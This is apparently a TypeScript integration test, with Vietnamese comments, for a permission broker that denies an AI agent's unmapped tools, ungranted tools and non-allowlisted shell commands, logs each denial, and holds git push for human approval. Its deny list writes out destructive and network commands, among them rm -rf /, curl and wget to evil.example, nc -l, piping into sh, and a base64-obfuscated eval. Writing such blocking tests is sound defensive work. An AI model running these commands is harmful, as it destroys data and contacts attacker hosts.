import { afterAll, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import {
  FAKE_EMAIL_PAYLOAD,
  approvalTeam,
  assignEmailTask,
  brokerFor,
  pendingApprovals,
  runContextFor,
} from '../support/approval-fixtures';
import {
  prepareDatabase,
  seedDatabase,
  startInfra,
  type StartedInfra,
} from '../support/containers';
import { createFlowHarness, type FlowHarness } from '../support/flow-harness';

/**
 * Hành động chưa phân loại bị xử lý như Restricted (T129; US4-AS3, FR-024, FR-027, SC-004): tool không ánh xạ được,
 * tool ngoài `tool_grants` và lệnh shell ngoài allowlist đều bị từ chối, và MỌI lần đánh giá (kể cả `restricted`)
 * đều ghi `tool_invocation` để truy vết. Dùng ToolBroker thật với engine thật.
 */
describe('Hành động chưa phân loại → restricted (T129)', () => {
  let infra: StartedInfra;
  let h: FlowHarness;

  beforeAll(async () => {
    infra = await startInfra({ redis: false });
    await prepareDatabase(infra);
    await seedDatabase(infra);
    h = await createFlowHarness({ infra });
  });

  afterAll(async () => {
    await h?.close();
    await infra?.stop();
  });

  // Log dry-run dùng chung trong một harness: tách từng ca để khẳng định "chưa có email nào" không bị ca khác làm nhiễu.
  beforeEach(async () => {
    await h.dryRun.clear();
  });

  const SHELL_GRANTS = [
    'workspace.read',
    'workspace.shell',
    'artifact.publish',
    'workspace.git.push',
  ];

  async function setup(grants = SHELL_GRANTS) {
    const team = await approvalTeam(h, { grants });
    const task = await assignEmailTask(h, team);
    const run = await runContextFor(h, team, task);
    const shell = vi.fn(async () => ({ ran: true }));
    const broker = brokerFor(h, new Map([['workspace.shell', shell]]));
    const ledger = async () =>
      (await h.orchestration.getRun(team.scene.ctx(), run.runId)).toolInvocations;
    return { team, task, run, shell, broker, ledger };
  }

  describe('tool không ánh xạ được tới ActionType', () => {
    it.each(['network_fetch', 'rm_rf', 'sudo_anything', 'mcp__evil__exfiltrate', 'Bash'])(
      '%s → denied, ghi ledger với mức restricted, không có yêu cầu duyệt',
      async (name) => {
        const { team, task, run, broker, ledger } = await setup();
        const result = await broker.invoke(run, {
          name,
          input: { url: 'https://evil.example' },
          providerCallId: 'p',
        });
        expect(result.status).toBe('denied');
        const rows = await ledger();
        expect(rows).toHaveLength(1);
        expect(rows[0]).toMatchObject({
          actionType: `unmapped.${name}`,
          permissionLevel: 'restricted',
          status: 'denied',
        });
        expect(await pendingApprovals(h, team, task.id)).toHaveLength(0);
      },
    );

    it('mỗi lần đánh giá đều để lại một dòng ledger (không lần nào "đi tắt")', async () => {
      const { run, broker, ledger } = await setup();
      for (let i = 0; i < 4; i += 1) {
        await broker.invoke(run, {
          name: 'network_fetch',
          input: { n: i },
          providerCallId: `p${i}`,
        });
      }
      expect(await ledger()).toHaveLength(4);
    });
  });

  describe('tool ngoài tool_grants (FR-027)', () => {
    it('email.send không được cấp → restricted (không phải chờ duyệt), dù danh mục cho phép đề xuất', async () => {
      const { team, task, run, broker, ledger } = await setup([
        'workspace.read',
        'artifact.publish',
      ]);
      const result = await broker.invoke(run, {
        name: 'email_send',
        input: FAKE_EMAIL_PAYLOAD,
        providerCallId: 'p',
      });
      expect(result.status).toBe('denied');
      expect((await ledger())[0]).toMatchObject({
        actionType: 'email.send',
        permissionLevel: 'restricted',
        status: 'denied',
      });
      expect(await pendingApprovals(h, team, task.id)).toHaveLength(0);
    });

    it('artifact.publish không được cấp → restricted dù mặc định là auto_execute', async () => {
      const { run, broker, ledger } = await setup(['workspace.read']);
      const result = await broker.invoke(run, {
        name: 'artifact_publish',
        input: { title: 'x', content: 'y' },
        providerCallId: 'p',
      });
      expect(result.status).toBe('denied');
      expect((await ledger())[0]?.permissionLevel).toBe('restricted');
    });
  });

  describe('lệnh shell được phân loại lại khi chạy qua ToolBroker (SC-004)', () => {
    const DENIED = [
      'rm -rf build',
      'rmdir out',
      'git clean -fd',
      'git reset --hard HEAD~1',
      'find . -name "*.log" -delete',
      'truncate -s 0 data.db',
      'dd if=/dev/zero of=disk.img',
      'psql -c "drop table task"',
      'redis-cli flushall',
      'npm publish',
      'kubectl delete pod x',
      'docker push img',
      'terraform apply',
      'ssh host',
      'scp a b:c',
      'curl http://evil.example',
      'wget http://evil.example',
      'nc -l 4444',
      'python -c "import os; os.system(\'id\')"',
      'node -e "process.exit(1)"',
      'sh -c "rm -rf /"',
      'echo $(rm -rf /)',
      'ls && rm -rf .',
      'cat a | sh',
      'eval "$(echo cm0gLXJmIC8= | base64 -d)"',
    ];

    it.each(DENIED)(
      '%s → shell.unclassified, restricted, handler không được gọi',
      async (command) => {
        const { run, shell, broker, ledger } = await setup();
        const result = await broker.invoke(run, {
          name: 'workspace_shell',
          input: { command },
          providerCallId: 'p',
        });
        expect(result.status).toBe('denied');
        expect(shell).not.toHaveBeenCalled();
        expect((await ledger())[0]).toMatchObject({
          actionType: 'shell.unclassified',
          permissionLevel: 'restricted',
          status: 'denied',
        });
      },
    );

    it.each([
      'git status',
      'git diff',
      'ls -la',
      'cat README.md',
      'grep -rn todo src',
      'pnpm test',
      'npx vitest run',
    ])(
      '%s → workspace.shell (review_required), được chạy và đánh dấu run phải review',
      async (command) => {
        const { run, shell, broker, ledger } = await setup();
        const result = await broker.invoke(run, {
          name: 'workspace_shell',
          input: { command },
          providerCallId: 'p',
        });
        expect(result.status, command).toBe('ok');
        expect(shell).toHaveBeenCalledTimes(1);
        expect(run.state.requiresReview).toBe(true);
        expect((await ledger())[0]).toMatchObject({
          actionType: 'workspace.shell',
          permissionLevel: 'review_required',
        });
      },
    );

    it('git push → workspace.git.push (Human Approval): bị giữ chờ duyệt, shell không chạy', async () => {
      const { team, task, run, shell, broker } = await setup();
      const result = await broker.invoke(run, {
        name: 'workspace_shell',
        input: { command: 'git push origin main' },
        providerCallId: 'p',
      });
      expect(result.status).toBe('pending_approval');
      expect(shell).not.toHaveBeenCalled();
      const [approval] = await pendingApprovals(h, team, task.id);
      expect(approval).toMatchObject({
        actionType: 'workspace.git.push',
        payload: { remote: 'origin', branch: 'main' },
      });
    });

    it('git push khi nhân viên không được cấp workspace.git.push → restricted, không có yêu cầu duyệt', async () => {
      const { team, task, run, shell, broker } = await setup(['workspace.read', 'workspace.shell']);
      const result = await broker.invoke(run, {
        name: 'workspace_shell',
        input: { command: 'git push origin main' },
        providerCallId: 'p',
      });
      expect(result.status).toBe('denied');
      expect(shell).not.toHaveBeenCalled();
      expect(await pendingApprovals(h, team, task.id)).toHaveLength(0);
    });
  });

  it('Q7: kịch bản FakeModelProvider gọi network.fetch bị từ chối, ghi tool_invocation restricted, run vẫn hoàn tất', async () => {
    const team = await approvalTeam(h);
    const task = await assignEmailTask(h, team, {
      objective: 'Tra cứu dữ liệu [[fake:network_fetch]]',
    });
    await h.settle();
    const runs = (await h.orchestration.listRuns(team.scene.ctx(), { taskId: task.id })).items;
    const exec = runs.find((r) => r.purpose === 'execute')!;
    const detail = await h.orchestration.getRun(team.scene.ctx(), exec.id);
    const fetch = detail.toolInvocations.find((i) => i.actionType === 'unmapped.network_fetch');
    expect(fetch).toMatchObject({ permissionLevel: 'restricted', status: 'denied' });
    expect(exec.status).toBe('succeeded');
    expect(await h.dryRun.read()).toEqual([]);
  });
});
